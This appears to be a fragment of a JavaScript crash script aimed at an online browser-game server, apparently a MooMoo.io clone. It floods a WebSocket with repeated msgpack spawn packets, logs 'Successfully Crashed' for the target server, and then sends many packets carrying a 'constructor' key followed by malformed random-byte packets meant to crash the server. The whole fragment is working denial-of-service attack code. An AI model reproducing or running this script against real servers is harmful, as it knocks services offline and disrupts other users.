        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.onmessage = () => {
            ws.msgs++;
            if (ws.msgs == 20) {
                    doNewSend(["ch", [`${logForCrashedServer}`]]);
                console.log(`Successfully Crashed ${logForCrashedServer}`);
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
               ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
                ws.send(new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]));
